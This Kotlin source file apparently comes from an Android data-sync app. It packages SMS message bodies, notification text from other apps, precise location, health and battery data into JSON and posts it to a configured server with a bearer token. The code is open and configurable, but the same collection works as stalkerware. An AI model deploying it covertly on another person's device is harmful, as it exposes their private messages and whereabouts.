package com.connect.app

import android.content.Context
import android.os.Build
import java.net.HttpURLConnection
import java.net.URL
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject

enum class UploadState {
    NOT_CONFIGURED,
    UPLOADING,
    SUCCESS,
    ERROR,
}

data class UploadStatus(
    val state: UploadState = UploadState.NOT_CONFIGURED,
    val message: String = "Upload is not configured",
    val timestamp: Long = 0,
)

object DataUploader {
    private const val CONNECT_TIMEOUT_MS = 15_000
    private const val READ_TIMEOUT_MS = 30_000
    private const val MAX_TEXT_LENGTH = 8_192

    private val mutex = Mutex()
    private val _status = MutableStateFlow(UploadStatus())
    val status = _status.asStateFlow()

    suspend fun upload(context: Context, data: CollectedData) = mutex.withLock {
        val config = UploadConfigStore.load(context)
        if (!config.configured) {
            _status.value = UploadStatus()
            return@withLock
        }
        _status.value = UploadStatus(UploadState.UPLOADING, "Uploading snapshot")
        runCatching {
            withContext(Dispatchers.IO) {
                send(context, config, data)
            }
        }.onSuccess {
            _status.value = UploadStatus(
                UploadState.SUCCESS,
                "Last upload succeeded",
                System.currentTimeMillis(),
            )
        }.onFailure { error ->
            _status.value = UploadStatus(
                UploadState.ERROR,
                error.message ?: "Upload failed",
                System.currentTimeMillis(),
            )
        }
    }

    private fun send(context: Context, config: UploadConfig, data: CollectedData) {
        val payload = data.toJSON(context).toString().toByteArray(Charsets.UTF_8)
        val connection = URL(config.endpoint).openConnection() as HttpURLConnection
        try {
            connection.requestMethod = "POST"
            connection.connectTimeout = CONNECT_TIMEOUT_MS
            connection.readTimeout = READ_TIMEOUT_MS
            connection.instanceFollowRedirects = false
            connection.doOutput = true
            connection.setFixedLengthStreamingMode(payload.size)
            connection.setRequestProperty("Authorization", "Bearer ${config.token}")
            connection.setRequestProperty("Content-Type", "application/json")
            connection.setRequestProperty("Accept", "application/json")
            connection.outputStream.use { it.write(payload) }
            val responseCode = connection.responseCode
            if (responseCode !in 200..299) {
                throw IllegalStateException("Server returned HTTP $responseCode")
            }
        } finally {
            connection.disconnect()
        }
    }

    private fun CollectedData.toJSON(context: Context): JSONObject = JSONObject().apply {
        put("deviceId", UploadConfigStore.deviceID(context))
        put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
        put("collectedAt", System.currentTimeMillis())
        put("health", health?.let { snapshot ->
            JSONObject().apply {
                put("steps", snapshot.steps)
                put("distanceKilometers", snapshot.distanceKilometers)
                put("activeCalories", snapshot.activeCalories)
                put("exerciseSessions", snapshot.exerciseSessions)
                put("collectedAt", snapshot.collectedAt)
            }
        } ?: JSONObject.NULL)
        put("smsMessages", JSONArray().apply {
            smsMessages.forEach { message ->
                put(JSONObject().apply {
                    put("id", message.id)
                    put("address", message.address.take(512))
                    put("body", message.body.take(MAX_TEXT_LENGTH))
                    put("timestamp", message.timestamp)
                    put("type", message.type)
                })
            }
        })
        put("notifications", JSONArray().apply {
            notifications.forEach { notification ->
                put(JSONObject().apply {
                    put("key", notification.key.take(1_024))
                    put("packageName", notification.packageName.take(512))
                    put("title", notification.title.take(2_048))
                    put("text", notification.text.take(MAX_TEXT_LENGTH))
                    put("timestamp", notification.timestamp)
                })
            }
        })
        put("battery", battery?.let { snapshot ->
            JSONObject().apply {
                put("levelPercent", snapshot.levelPercent)
                put("charging", snapshot.charging)
                put("temperatureCelsius", snapshot.temperatureCelsius)
                put("plugged", snapshot.plugged)
            }
        } ?: JSONObject.NULL)
        put("location", location?.let { snapshot ->
            JSONObject().apply {
                put("latitude", snapshot.latitude)
                put("longitude", snapshot.longitude)
                put("accuracyMeters", snapshot.accuracyMeters.toDouble())
                put("altitudeMeters", snapshot.altitudeMeters)
                put("speedMetersPerSecond", snapshot.speedMetersPerSecond.toDouble())
                put("provider", snapshot.provider)
                put("timestamp", snapshot.timestamp)
            }
        } ?: JSONObject.NULL)
    }
}
